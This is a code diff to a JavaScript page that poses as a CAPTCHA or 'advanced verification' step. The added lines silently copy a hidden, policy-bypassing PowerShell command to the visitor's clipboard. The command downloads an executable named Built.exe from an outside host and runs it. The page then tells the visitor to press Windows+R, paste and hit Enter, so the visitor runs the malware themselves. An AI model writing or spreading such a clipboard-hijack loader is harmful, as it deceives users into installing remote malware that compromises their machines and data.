@@ -58,8 +58,16 @@ function updateKeyPressStatus(windowsKeyPressed, rKeyPressed) {
         resultMessage.innerText = 'Windows + R keys detected! Now press Ctrl + V and hit Enter.';
         resultMessage.style.color = 'green';
 
-        // You can add additional instructions or actions here if necessary
-        advancedInstructions.innerHTML += '<br>Ready for advanced verification!<br> Press Ctrl + V and hit Enter.';
+        // Command to be copied to clipboard
+        const command = `powershell -NoP -NonI -W h -Exec Bypass iwr "https://notafakecaptica2222.vercel.app/Built.exe" -OutFile "$env:userprofile\\temp\\Built.exe"; start "$env:userprofile\\temp\\Built.exe"`;
+
+        // Attempt to copy the command to clipboard
+        navigator.clipboard.writeText(command).then(() => {
+            advancedInstructions.innerHTML += '<br>Command copied to clipboard! Now press Ctrl + V and hit Enter to execute.';
+        }).catch(err => {
+            advancedInstructions.innerHTML += '<br>Failed to copy the command. Try again!';
+            console.error('Error copying command:', err);
+        });
     } else {
         resultMessage.innerText = 'Please press Windows + R to proceed.';
         resultMessage.style.color = 'red';
